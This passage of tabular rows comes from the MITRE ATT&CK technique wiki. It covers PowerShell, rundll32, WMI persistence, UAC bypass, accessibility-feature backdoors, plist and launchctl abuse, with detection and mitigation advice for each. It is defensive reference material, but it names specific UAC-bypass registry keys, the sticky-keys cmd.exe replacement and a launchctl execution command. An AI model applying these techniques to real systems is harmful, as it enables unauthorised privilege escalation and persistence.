\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nAdministrator permissions are required to use PowerShell to connect to remote systems.\n\nA number of PowerShell-based offensive testing tools are available, including Empire,[[CiteRef::Github PowerShell Empire]] PowerSploit,[[CiteRef::Powersploit]] and PSAttack.[[CiteRef::Github PSAttack]]']",[],[],[],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],Technique/T1086,['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
1441,['Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity. Command arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded.'],"['Anti-virus', 'Application whitelisting']",[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.'],[],[],[],"[""Microsoft's Enhanced Mitigation Experience Toolkit (EMET) Attack Surface Reduction (ASR) feature can be used to block methods of using rundll32.exe to bypass whitelisting.[[CiteRef::Secure Host Baseline EMET]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['User'],[],[],"['Defense Evasion', 'Execution']",Technique/T1085,['Rundll32'],https://attack.mitre.org/wiki/Technique/T1085
1442,"['Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.[[CiteRef::TechNet Autoruns]]']",[],[],[],['WMI Objects'],"[""Windows Management Instrumentation (WMI) can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may attempt to evade detection of this technique by compiling WMI scripts.[[CiteRef::Dell WMI Persistence]] Examples of events that may be subscribed to are the wall clock time or the computer's uptime.[[CiteRef::Kazanciyan 2014]] Several threat groups have reportedly used this technique to maintain persistence.[[CiteRef::Mandiant M-Trends 2015]]""]",[],[],[],"['Disabling WMI services may cause system instability and should be evaluated to assess the impact to a network. By default, only administrators are allowed to connect remotely using WMI; restrict other users that are allowed to connect, or disallow all users from connecting remotely to WMI. Prevent credential overlap across systems of administrator and privileged accounts.[[CiteRef::FireEye WMI 2015]]']","['Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],[],['Persistence'],Technique/T1084,['Windows Management Instrumentation Event Subscription'],https://attack.mitre.org/wiki/Technique/T1084
1443,['Monitor processes and command-line arguments to see if security tools are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Lack of log or event file reporting may be suspicious.'],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Signature-based detection', 'Log analysis']",['578'],[],"['API monitoring', 'Anti-virus', 'File monitoring', 'Services', 'Windows Registry', 'Process command-line parameters']","['Adversaries may disable security tools to avoid possible detection of their tools and activities. This can take the form of killing security software or event logging processes, deleting Registry keys so that tools do not start at run time, or other methods to interfere with security scanning or event reporting.']",[],[],[],"['Ensure proper process, registry, and file permissions are in place to prevent adversaries from disabling or interfering with security services.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],Technique/T1089,['Disabling Security Tools'],https://attack.mitre.org/wiki/Technique/T1089
1444,"['There are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Monitor process API calls for behavior that may be indicative of [[Technique/T1055|DLL Injection]] and unusual loaded DLLs through [[Technique/T1038|DLL Search Order Hijacking]], which indicate attempts to gain access to higher privileged processes.\n\nSome UAC bypass methods rely on modifying specific, user-accessible Registry settings.  For example:\n\n* The <code>eventvwr.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Classes\\mscfile\\shell\\open\\command</code> Registry key.[[CiteRef::enigma0x3 Fileless UAC Bypass]]\n* The <code>sdclt.exe</code> bypass uses the <code>[HKEY_CURRENT_USER]\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe</code> and <code>[HKEY_CURRENT_USER]\\Software\\Classes\\exefile\\shell\\runas\\command\\isolatedCommand</code> Registry keys.[[CiteRef::enigma0x3 sdclt app paths]][[CiteRef::enigma0x3 sdclt bypass]]\n\nAnalysts should monitor these Registry settings for unauthorized changes.']",['Windows User Account Control'],[],"['Stefan Kanthak', 'Casey Smith']","['System calls', 'Process monitoring', 'Authentication logs', 'Process command-line parameters']","['Windows User Account Control (UAC) allows a program to elevate its privileges to perform a task under administrator-level permissions by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.[[CiteRef::TechNet How UAC Works]]\n\nIf the UAC protection level of a computer is set to anything but the highest level, certain Windows programs are allowed to elevate privileges or execute some elevated COM objects without prompting the user through the UAC notification box.[[CiteRef::TechNet Inside UAC]][[CiteRef::MSDN COM Elevation]] An example of this is use of rundll32.exe to load a specifically crafted DLL which loads an auto-elevated COM object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.[[CiteRef::Davidson Windows]] Adversaries can use these techniques to elevate privileges to administrator if the target process is unprotected.\n\nMany methods have been discovered to bypass UAC. The Github readme page for UACMe contains an extensive list of methods[[CiteRef::Github UACMe]] that have been discovered and implemented within UACMe, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:\n\n* <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.[[CiteRef::enigma0x3 Fileless UAC Bypass]][[CiteRef::Fortinet Fareit]]\n\nAnother bypass is possible through some [[Lateral Movement]] techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on lateral systems and default to high integrity.[[CiteRef::SANS UAC Bypass]]']",[],[],[],"['Remove users from the local administrator group on systems. Although UAC bypass techniques exist, it is still prudent to use the highest enforcement level for UAC when possible and mitigate bypass opportunities that exist with techniques such as [[Technique/T1038|DLL Search Order Hijacking]]. \n\nCheck for common UAC bypass weaknesses on Windows systems to be aware of the risk posture and address issues where appropriate.[[CiteRef::Github UACMe]]']","['Windows Server 2012', 'Windows 7', 'Windows 8', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Privilege Escalation']",Technique/T1088,['Bypass User Account Control'],https://attack.mitre.org/wiki/Technique/T1088
1445,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Network protocol analysis', 'Process command-line parameters', 'Process monitoring', 'Process use of network']","['Adversaries will likely attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for [[Lateral Movement]] from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used. \n\n===Windows===\n\nExamples of tools and commands that acquire this information include ""ping"" or ""net view"" using [[Software/S0039|Net]].\n\n===Mac===\n\nSpecific to Mac, the <code>bonjour</code> protocol to discover additional Mac-based systems within the same broadcast domain. Utilities such as ""ping"" and others can be used to gather information about remote systems.\n\n===Linux===\n\nUtilities such as ""ping"" and others can be used to gather information about remote systems.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information on remotely available systems, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM', 'User']",[],[],['Discovery'],Technique/T1018,['Remote System Discovery'],https://attack.mitre.org/wiki/Technique/T1018
1446,"['System firmware manipulation may be detected.[[CiteRef::MITRE Trustworthy Firmware Measurement]] Dump and inspect BIOS images on vulnerable systems and compare against known good images.[[CiteRef::MITRE Copernicus]] Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.\n\nLikewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed.[[CiteRef::McAfee CHIPSEC Blog]][[CiteRef::Github CHIPSEC]][[CiteRef::Intel HackingTeam UEFI Rootkit]]']",[],['532'],"['Ryan Becwar', 'McAfee']","['API monitoring', 'BIOS', 'EFI']","['The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.[[CiteRef::Wikipedia BIOS]][[CiteRef::Wikipedia UEFI]][[CiteRef::About UEFI]]\n\nSystem firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.']",[],[],[],['Prevent adversary access to privileged accounts or access necessary to perform this technique. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification. Patch the BIOS and EFI as necessary. Use Trusted Platform Module technology.[[CiteRef::TCG Trusted Platform Module]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Persistence'],Technique/T1019,['System Firmware'],https://attack.mitre.org/wiki/Technique/T1019
1447,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']","['Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used or give context to information collected by a keylogger.\n\nIn Mac, this can be done natively with a small [[Technique/T1155|AppleScript]] script.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],Technique/T1010,['Application Window Discovery'],https://attack.mitre.org/wiki/Technique/T1010
1448,"['Processes utilizing the network that do not normally have network communication or have never been seen before. Processes that normally require user-driven events to access the network (for example, a mouse click or key press) but access the network without such may be malicious.']",[],[],"['Itzik Kotler, SafeBreach']","['User interface', 'Process monitoring']","['Exfiltration could occur over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel. Adversaries could choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.']",[],[],[],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1011,['Exfiltration Over Other Network Medium'],https://attack.mitre.org/wiki/Technique/T1011
1449,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [[Software/S0075|Reg]] or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['Windows Registry', 'Process monitoring', 'Process command-line parameters']","['Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.\n\nThe Registry contains a significant amount of information about the operating system, configuration, software, and security.[[CiteRef::Wikipedia Windows Registry]] Some of the information may help adversaries to further their operation within a network.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information within the Registry, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],Technique/T1012,['Query Registry'],https://attack.mitre.org/wiki/Technique/T1012
1450,"['* Monitor process API calls to AddMonitor.\n* Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal.\n* New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious.\n* Monitor registry writes to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>.\n* Run the Autoruns utility, which checks for this Registry key as a persistence mechanism[[CiteRef::TechNet Autoruns]]']",[],[],['Stefan Kanthak'],"['File monitoring', 'API monitoring', 'DLL monitoring', 'Windows Registry', 'Process monitoring']","['A port monitor can be set through the AddMonitor API call to set a DLL to be loaded at startup.[[CiteRef::AddMonitor]] This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot.[[CiteRef::Bloxham]] Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>.[[CiteRef::Bloxham]] The spoolsv.exe process also runs under SYSTEM level permissions.\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.']",[],[],[],['Identify and block potentially malicious software that may persist in this manner by using whitelisting[[CiteRef::Beechey 2010]] tools capable of monitoring DLL loads by processes running under SYSTEM permissions.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],"['Persistence', 'Privilege Escalation']",Technique/T1013,['Local Port Monitor'],https://attack.mitre.org/wiki/Technique/T1013
1451,"['Some rootkit protections may be built into anti-virus or operating system software. There are dedicated rootkit detection tools that look for specific types of rootkit behavior. Monitor for the existence of unrecognized DLLs, devices, services, and changes to the MBR.[[CiteRef::Wikipedia Rootkit]]']","['Anti-virus', 'File monitoring', 'Host intrusion prevention systems', 'Process whitelisting', 'Signature-based detection', 'System access controls', 'Whitelisting by file name or path']",[],[],"['BIOS', 'MBR', 'System calls']","['Rootkits are programs that hide the existence of malware by intercepting and modifying operating system API calls that supply system information. Rootkits or rootkit enabling functionality may reside at the user or kernel level in the operating system or lower, to include a [[Technique/T1062|Hypervisor]], Master Boot Record, or the [[Technique/T1019|System Firmware]].[[CiteRef::Wikipedia Rootkit]]\n\nAdversaries may use rootkits to hide the presence of programs, files, network connections, services, drivers, and other system components.']",[],[],[],"['Identify potentially malicious software that may contain rootkit functionality, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Defense Evasion'],Technique/T1014,['Rootkit'],https://attack.mitre.org/wiki/Technique/T1014
1452,"['Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options</code>.']",[],['558'],"['Paul Speulstra, AECOM Global Security Operations Center']","['Windows Registry', 'File monitoring', 'Process monitoring']","['Windows contains accessibility features that may be launched with a key combination before a user has logged in (for example, when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\n\nTwo common accessibility programs are <code>C:\\Windows\\System32\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\Windows\\System32\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.[[CiteRef::FireEye Hikit Rootkit]]\n\nDepending on the version of Windows, an adversary may take advantage of these features in different ways because of code integrity enhancements. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP).[[CiteRef::DEFCON2016 Sticky Keys]] The debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced. Examples for both methods:\n\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\Windows\\System32\\utilman.exe</code>) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [[Technique/T1076|Remote Desktop Protocol]] will cause the replaced file to be executed with SYSTEM privileges.[[CiteRef::Tilbury 2014]]\n\nFor the debugger method on Windows Vista and later as well as Windows Server 2008 and later, for example, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for the accessibility program (e.g., ""utilman.exe""). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with RDP will cause the ""debugger"" program to be executed with SYSTEM privileges.[[CiteRef::Tilbury 2014]]\n\nOther accessibility features exist that may also be leveraged in a similar fashion:[[CiteRef::DEFCON2016 Sticky Keys]]\n\n*On-Screen Keyboard: <code>C:\\Windows\\System32\\osk.exe</code>\n*Magnifier: <code>C:\\Windows\\System32\\Magnify.exe</code>\n*Narrator: <code>C:\\Windows\\System32\\Narrator.exe</code>\n*Display Switcher: <code>C:\\Windows\\System32\\DisplaySwitch.exe</code>\n*App Switcher: <code>C:\\Windows\\System32\\AtBroker.exe</code>']",[],[],[],"['To use this technique remotely, an adversary must use it in conjunction with RDP. Ensure that Network Level Authentication is enabled to force the remote desktop session to authenticate before the session is created and the login screen displayed. It is enabled by default on Windows Vista and later.[[CiteRef::TechNet RDP NLA]]\n\nIf possible, use a Remote Desktop Gateway to manage connections and security configuration of RDP within a network.[[CiteRef::TechNet RDP Gateway]]\n\nIdentify and block potentially malicious software that may be executed by an adversary with this technique by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],"['Persistence', 'Privilege Escalation']",Technique/T1015,['Accessibility Features'],https://attack.mitre.org/wiki/Technique/T1015
1453,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['309'],[],"['Process command-line parameters', 'Process monitoring']","['Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include [[Software/S0099|Arp]], [[Software/S0100|ipconfig]]/[[Software/S0101|ifconfig]], [[Software/S0102|nbtstat]], and [[Software/S0103|route]].']",[],[],[],"[""Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about a system's network configuration, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],Technique/T1016,['System Network Configuration Discovery'],https://attack.mitre.org/wiki/Technique/T1016
1454,['Monitor application deployments from a secondary system. Perform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.'],[],['187'],[],"['File monitoring', 'Process use of network', 'Process monitoring']","['Adversaries may deploy malicious software to systems within a network using application deployment systems employed by enterprise administrators. The permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the deployment server, or specific domain credentials may be required. However, the system may require an administrative account to log in or to perform software deployment.\n\nAccess to a network-wide or enterprise-wide software deployment system enables an adversary to have remote code execution on all systems that are connected to such a system. The access may be used to laterally move to systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.']",[],[],[],"['Grant access to application deployment systems only to a limited number of authorized administrators. Ensure proper system and access isolation for critical network systems through use of firewalls, account privilege separation, group policy, and multifactor authentication. Verify that account credentials that may be used to access deployment systems are unique and not used throughout the enterprise network. Patch deployment systems regularly to prevent potential remote access through [[Technique/T1068|Exploitation of Vulnerability]]. \n\nIf the application deployment system can be configured to deploy only signed binaries, then ensure that the trusted signing certificates are not co-located with the application deployment system and are instead located on a system that cannot be accessed remotely or to which remote access is tightly controlled.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],"['Access to application deployment software (EPO, HPCA, Altiris, etc.)']",[],['Lateral Movement'],Technique/T1017,['Application Deployment Software'],https://attack.mitre.org/wiki/Technique/T1017
1455,"[""It's not common for spaces to be at the end of filenames, so this is something that can easily be checked with file monitoring. From the user's perspective though, this is very hard to notice from within the Finder.app or on the command-line in Terminal.app. Processes executed from binaries containing non-standard extensions in the filename are suspicious.""]",[],[],"['Erye Hernandez, Palo Alto Networks']","['File monitoring', 'Process Monitoring']","['Adversaries can hide a program\'s true filetype by changing the extension of a file. With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the operating system. For example, if there is a Mach-O executable file called evil.bin, when it is double clicked by a user, it will launch Terminal.app and execute. If this file is renamed to evil.txt, then when double clicked by a user, it will launch with the default text editing application (not executing the binary). However, if the file is renamed to ""evil.txt "" (note the space at the end), then when double clicked by a user, the true file type is determined by the OS and handled appropriately and the binary will be executed[[CiteRef::Mac Backdoors are back]]. \n\nAdversaries can use this feature to trick users into double clicking benign-looking files of any format and ultimately executing something malicious.']",[],[],[],['Prevent files from having a trailing space after the extension.'],"['Linux', 'MacOS', 'OS X']",['User'],[],[],"['Defense Evasion', 'Execution']",Technique/T1151,['Space after Filename'],https://attack.mitre.org/wiki/Technique/T1151
1456,"['File system monitoring can determine if plist files are being modified. Users should not have permission to modify these in most cases. Some software tools like ""Knock Knock"" can detect persistence mechanisms and point to the specific files that are being referenced. This can be helpful to see what is actually being executed.\n\nMonitor process execution for abnormal process execution resulting from modified plist files. Monitor utilities used to modify plist files or that take a plist file as an argument, which may indicate suspicious activity.']","['Application whitelisting', 'Process whitelisting', 'Whitelisting by file name or path']",[],[],"['File monitoring', 'Process Monitoring', 'Process command-line parameters']","[""Property list (plist) files contain all of the information that macOS and OS X uses to configure applications and services. These files are UT-8 encoded and formatted like XML documents via a series of keys surrounded by < >. They detail when programs should execute, file paths to the executables, program arguments, required OS permissions, and many others. plists are located in certain locations depending on their purpose such as <code>/Library/Preferences</code> (which execute with elevated privileges) and <code>~/Library/Preferences</code> (which execute with a user's privileges). \nAdversaries can modify these plist files to point to their own code, can use them to execute their code in the context of another user, bypass whitelisting procedures, or even use them as a persistence mechanism[[CiteRef::Sofacy Komplex Trojan]].""]",[],[],[],['Prevent plist files from being modified by users by making them read-only.'],"['MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",Technique/T1150,['Plist Modification'],https://attack.mitre.org/wiki/Technique/T1150
1457,"['Monitor for command shell execution of source and subsequent processes that are started as a result of being executed by a source command. Adversaries must also drop a file to disk in order to execute it with source, and these files can also detected by file monitoring.']",[],[],[],"['Process Monitoring', 'File monitoring', 'Process command-line parameters']","['The <code>source</code> command loads functions into the current shell or executes files in the current context. This built-in command can be run in two different ways <code>source /path/to/filename [arguments]</code> or <code>. /path/to/filename [arguments]</code>. Take note of the space after the ""."". Without a space, a new shell is created that runs the program instead of running the program within the current context. This is often used to make certain features or functions available to a shell or to update a specific shell\'s environment. \n\nAdversaries can abuse this functionality to execute programs. The file executed with this technique does not need to be marked executable beforehand.']",[],[],[],"[""Due to potential legitimate uses of source commands, it's may be difficult to mitigate use of this technique.""]","['Linux', 'MacOS', 'OS X']",['User'],[],[],['Execution'],Technique/T1153,['Source'],https://attack.mitre.org/wiki/Technique/T1153
1458,"['Knock Knock can be used to detect persistent programs such as those installed via launchctl as launch agents or launch daemons. Additionally, every launch agent or launch daemon must have a corresponding plist file on disk somewhere which can be monitored. Monitor process execution from launchctl/launchd for unusual or unknown processes.']","['Application whitelisting', 'Process whitelisting', 'Whitelisting by file name or path']",[],[],"['File monitoring', 'Process Monitoring', 'Process command-line parameters']","['Launchctl controls the macOS launchd process which handles things like launch agents and launch daemons, but can execute other commands or programs itself. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input. By loading or reloading launch agents or launch daemons, adversaries can install persistence or execute changes they made [[CiteRef::Sofacy Komplex Trojan]]. Running a command from launchctl is as simple as <code>launchctl submit -l <labelName> -- /Path/to/thing/to/execute ""arg"" ""arg"" ""arg""</code>. Loading, unloading, or reloading launch agents or launch daemons can require elevated privileges. \n\nAdversaries can abuse this functionality to execute 